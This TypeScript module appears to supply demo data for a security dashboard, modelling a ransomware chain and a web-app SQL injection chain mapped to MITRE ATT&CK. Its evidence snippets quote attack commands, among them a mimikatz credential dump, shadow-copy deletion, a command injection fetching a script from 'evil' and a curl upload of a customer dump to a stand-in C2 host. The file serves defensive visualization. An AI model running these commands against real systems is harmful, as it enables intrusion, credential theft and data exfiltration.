import type { MitreTechnique } from './types';
import { getMitre } from './mitre';

// ===== Attack Visualization Data =====
// Models multi-stage attack chains (kill chain) for the React Flow
// visualization. Each chain shows how an adversary progresses from
// initial access through impact, mapped to MITRE ATT&CK.

export interface AttackStage {
  id: string;
  killChainPhase: string;
  mitre: string;
  techniqueName: string;
  tactic: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  eventCount: number;
  timestamp: string;
  detected: boolean;
  evidenceSnippet: string;
}

export interface AttackChain {
  id: string;
  name: string;
  attacker: string;
  target: string;
  startTime: string;
  stages: AttackStage[];
  totalThreatScore: number;
  status: 'active' | 'contained' | 'resolved';
}

export const ATTACK_CHAINS: AttackChain[] = [
  {
    id: 'chain-ransomware',
    name: 'Ransomware Operation via Encoded PowerShell',
    attacker: 'APT-29 (Cozy Bear) — 185.220.101.45',
    target: 'CORP-DC01 (Domain Controller)',
    startTime: '2025-07-25T08:00:00Z',
    totalThreatScore: 95,
    status: 'contained',
    stages: [
      {
        id: 's1',
        killChainPhase: '1. Reconnaissance',
        mitre: 'T1595',
        techniqueName: 'Active Scanning',
        tactic: 'Reconnaissance',
        description: 'Attacker performed network port scanning to identify exposed services.',
        severity: 'medium',
        eventCount: 42,
        timestamp: '2025-07-25T08:00:00Z',
        detected: true,
        evidenceSnippet: 'nmap -sS -p 22,80,3389,445 10.10.0.0/24',
      },
      {
        id: 's2',
        killChainPhase: '2. Initial Access',
        mitre: 'T1078',
        techniqueName: 'Valid Accounts',
        tactic: 'Initial Access',
        description: 'Compromised credentials used to access the network via VPN.',
        severity: 'high',
        eventCount: 3,
        timestamp: '2025-07-25T08:15:00Z',
        detected: true,
        evidenceSnippet: 'VPN login: jdoe@corp from 185.220.101.45 — success',
      },
      {
        id: 's3',
        killChainPhase: '3. Execution',
        mitre: 'T1059.001',
        techniqueName: 'PowerShell (Encoded)',
        tactic: 'Execution',
        description: 'Encoded PowerShell payload dropped and executed from Word macro.',
        severity: 'high',
        eventCount: 7,
        timestamp: '2025-07-25T08:32:00Z',
        detected: true,
        evidenceSnippet: 'powershell.exe -nop -w hidden -enc SQBFAFgA...',
      },
      {
        id: 's4',
        killChainPhase: '4. Credential Access',
        mitre: 'T1003.001',
        techniqueName: 'LSASS Memory',
        tactic: 'Credential Access',
        description: 'Mimikatz executed to dump LSASS credentials for lateral movement.',
        severity: 'critical',
        eventCount: 2,
        timestamp: '2025-07-25T08:45:00Z',
        detected: true,
        evidenceSnippet: 'mimikatz.exe "sekurlsa::logonpasswords"',
      },
      {
        id: 's5',
        killChainPhase: '5. Lateral Movement',
        mitre: 'T1550.002',
        techniqueName: 'Pass the Hash',
        tactic: 'Lateral Movement',
        description: 'Stolen NTLM hash used to authenticate to additional hosts via SMB.',
        severity: 'critical',
        eventCount: 12,
        timestamp: '2025-07-25T09:10:00Z',
        detected: true,
        evidenceSnippet: 'NTLM logon success: Administrator → CORP-FILE01 via SMB',
      },
      {
        id: 's6',
        killChainPhase: '6. Persistence',
        mitre: 'T1053.005',
        techniqueName: 'Scheduled Task',
        tactic: 'Persistence',
        description: 'Scheduled task created for recurring beacon execution.',
        severity: 'high',
        eventCount: 4,
        timestamp: '2025-07-25T09:25:00Z',
        detected: true,
        evidenceSnippet: 'schtasks /create /tn "UpdateCheck" /tr "powershell -enc ..." /sc minute',
      },
      {
        id: 's7',
        killChainPhase: '7. Impact',
        mitre: 'T1486',
        techniqueName: 'Data Encrypted for Impact',
        tactic: 'Impact',
        description: 'Ransomware payload encrypted files on file server and domain controller.',
        severity: 'critical',
        eventCount: 1850,
        timestamp: '2025-07-25T10:00:00Z',
        detected: true,
        evidenceSnippet: 'vssadmin delete shadows /all /quiet → file encryption started',
      },
    ],
  },
  {
    id: 'chain-webapp',
    name: 'Web Application Compromise via SQL Injection',
    attacker: 'Unknown — 45.155.205.233',
    target: 'WEB-APP-01 (E-commerce)',
    startTime: '2025-07-25T07:30:00Z',
    totalThreatScore: 82,
    status: 'active',
    stages: [
      {
        id: 'w1',
        killChainPhase: '1. Reconnaissance',
        mitre: 'T1595',
        techniqueName: 'Active Scanning',
        tactic: 'Reconnaissance',
        description: 'Automated scanning of web endpoints for injection points.',
        severity: 'medium',
        eventCount: 88,
        timestamp: '2025-07-25T07:30:00Z',
        detected: true,
        evidenceSnippet: 'GET /search?q=test GET /login.php?id=1 GET /api/products',
      },
      {
        id: 'w2',
        killChainPhase: '2. Initial Access',
        mitre: 'T1190',
        techniqueName: 'SQL Injection',
        tactic: 'Initial Access',
        description: 'SQL injection bypassed authentication on the login form.',
        severity: 'critical',
        eventCount: 15,
        timestamp: '2025-07-25T07:48:00Z',
        detected: true,
        evidenceSnippet: "POST /login.php — id=1' OR '1'='1' -- - (sqlmap)",
      },
      {
        id: 'w3',
        killChainPhase: '3. Execution',
        mitre: 'T1059',
        techniqueName: 'Command and Scripting',
        tactic: 'Execution',
        description: 'OS command injection executed via the vulnerable parameter.',
        severity: 'critical',
        eventCount: 6,
        timestamp: '2025-07-25T08:02:00Z',
        detected: true,
        evidenceSnippet: 'GET /ping?host=127.0.0.1;wget http://evil/x.sh -O /tmp/x.sh',
      },
      {
        id: 'w4',
        killChainPhase: '4. Discovery',
        mitre: 'T1083',
        techniqueName: 'File and Directory Discovery',
        tactic: 'Discovery',
        description: 'Attacker enumerated directories and found the database config file.',
        severity: 'medium',
        eventCount: 23,
        timestamp: '2025-07-25T08:15:00Z',
        detected: true,
        evidenceSnippet: 'ls -la /var/www/ → cat /var/www/config/db.php',
      },
      {
        id: 'w5',
        killChainPhase: '5. Collection',
        mitre: 'T1005',
        techniqueName: 'Data from Local System',
        tactic: 'Collection',
        description: 'Customer database and payment records accessed and staged.',
        severity: 'high',
        eventCount: 1,
        timestamp: '2025-07-25T08:40:00Z',
        detected: true,
        evidenceSnippet: 'mysqldump customers > /tmp/customers_dump.sql',
      },
      {
        id: 'w6',
        killChainPhase: '6. Exfiltration',
        mitre: 'T1041',
        techniqueName: 'Exfiltration Over C2 Channel',
        tactic: 'Exfiltration',
        description: 'Data exfiltrated over established C2 tunnel to attacker server.',
        severity: 'critical',
        eventCount: 1,
        timestamp: '2025-07-25T09:00:00Z',
        detected: false,
        evidenceSnippet: 'curl -X POST https://c2.evil.tld/upload -F file=@/tmp/customers_dump.sql',
      },
    ],
  },
];

export function getAttackChain(id: string): AttackChain | undefined {
  return ATTACK_CHAINS.find((c) => c.id === id);
}

export function getAllStages(): AttackStage[] {
  return ATTACK_CHAINS.flatMap((c) => c.stages);
}

// Unique MITRE techniques seen across all chains (for coverage display)
export function getChainMitreCoverage(): { id: string; name: string; tactic: string; chains: number }[] {
  const map = new Map<string, { id: string; name: string; tactic: string; chains: Set<string> }>();
  for (const chain of ATTACK_CHAINS) {
    for (const stage of chain.stages) {
      const m = getMitre(stage.mitre);
      if (!map.has(stage.mitre)) {
        map.set(stage.mitre, {
          id: stage.mitre,
          name: m?.name || stage.techniqueName,
          tactic: m?.tactic || stage.tactic,
          chains: new Set(),
        });
      }
      map.get(stage.mitre)!.chains.add(chain.id);
    }
  }
  return Array.from(map.values()).map((v) => ({ ...v, chains: v.chains.size }));
}
